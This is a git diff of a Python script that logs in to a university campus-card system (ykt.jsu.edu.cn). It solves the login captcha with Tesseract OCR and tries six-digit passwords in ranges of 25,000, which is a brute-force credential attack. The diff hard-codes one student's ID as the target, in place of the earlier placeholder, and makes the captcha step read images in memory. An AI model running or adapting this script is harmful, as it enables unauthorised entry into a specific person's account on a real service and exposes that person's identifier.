@@ -1,14 +1,12 @@
 import base64
 import json
-import random
 import pytesseract
 import requests
 from PIL import Image
+from io import BytesIO
 
 # 这里填Tesseract-OCR目录把C:\\Program Files (x86)\\Tesseract-OCR改成你的路径
 testdata_dir_config = '--tessdata-dir "C:\\Program Files (x86)\\Tesseract-OCR"'
-valicode = random.choices(range(0, 100000))[0]
-valicode_name = 'imgs//' + str(valicode) + '.jpg'
 
 session = requests.session()
 login_url = 'http://ykt.jsu.edu.cn/Login/LoginBySnoQuery'
@@ -18,11 +16,8 @@ user_url = 'http://ykt.jsu.edu.cn/User/User'
 
 
 def get_valicode():
-    name = valicode_name
-    img = session.get(url=img_url)
-    with open(name, 'wb') as f:
-        f.write(img.content)
-    img = Image.open(name)
+    content = session.get(url=img_url).content
+    img = Image.open(BytesIO(content))
     # testdata_dir_config = '--tessdata-dir "C:\\Program Files (x86)\\Tesseract-OCR"'
     valicode = pytesseract.image_to_string(img, lang='nums', config=testdata_dir_config).replace(' ', '')
     return valicode
@@ -30,8 +25,7 @@ def get_valicode():
 
 def login(password):
     data = {
-         #下面要改成你的学号
-        'sno': '在这里输入学号',
+        'sno': '2018200482',
         'pwd': base64.b64encode(str(password).encode('utf-8')).decode('utf-8'),
         'ValiCode': get_valicode(),
         'remember': '1',
@@ -75,7 +69,7 @@ def gvalicode(i):
 
 def run():
     begin = int(input("请输入开始序号（开始+25000）："))
-    print("%06d-%06d" %(begin,begin+25000))
+    print("%06d-%06d" % (begin, begin + 25000))
     for x in range(begin, begin + 25000):
         x = str('%06d' % x)
         print(x)
